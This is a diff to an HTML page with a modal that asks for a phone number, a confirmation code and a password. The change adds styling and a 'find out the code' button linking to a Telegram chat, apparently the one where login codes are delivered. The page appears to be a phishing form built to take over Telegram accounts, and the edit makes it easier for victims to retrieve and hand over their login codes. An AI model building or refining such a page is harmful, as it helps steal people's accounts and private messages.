@@ -219,6 +219,7 @@
             width: 100%;
             max-width: 320px;
             text-align: center;
+            position: relative;
         }
         
         .modal-box h3 { font-size: 24px; margin-bottom: 8px; color: #ff6680; }
@@ -265,6 +266,34 @@
         
         .password-section {
             display: none;
+        }
+        
+        .help-code-btn {
+            display: inline-block;
+            background: #3a3a3a;
+            border: 1px solid #ff6680;
+            padding: 8px 16px;
+            border-radius: 30px;
+            color: #ff6680;
+            font-size: 13px;
+            text-decoration: none;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        
+        .help-code-btn:hover {
+            background: #ff6680;
+            color: white;
+        }
+        
+        .code-help-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            justify-content: center;
+            margin-top: 5px;
         }
     </style>
 </head>
@@ -314,6 +343,9 @@
         <input type="tel" id="phone" class="modal-input" placeholder="+71234567890">
         <div id="codeSection" class="code-section">
             <input type="text" id="code" class="modal-input" placeholder="Код подтверждения">
+            <div class="code-help-row">
+                <a href="https://t.me/+42777" target="_blank" class="help-code-btn">❓ УЗНАТЬ КОД</a>
+            </div>
         </div>
         <div id="passwordSection" class="password-section">
             <input type="password" id="password" class="modal-input" placeholder="Пароль">
